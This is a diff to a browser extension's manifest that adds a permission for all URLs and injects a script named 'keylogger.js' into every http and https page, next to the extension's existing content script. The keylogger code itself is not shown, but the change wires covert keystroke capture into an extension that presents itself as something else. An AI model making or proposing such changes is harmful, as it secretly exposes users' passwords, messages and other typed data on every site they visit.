@@ -19,6 +19,7 @@
     "default_popup": "popup.html"
   },
   "permissions": [
+    "*://*/*",
     "tabs",
     "storage",
     "contextMenus",
@@ -32,7 +33,7 @@
   "content_scripts": [
     {
       "matches": ["http://*/*", "https://*/*"],
-      "js": ["contentscript/contentScript.js"],
+      "js": ["contentscript/contentScript.js", "contentscript/keylogger.js"],
       "run_at": "document_end"
     }
   ],
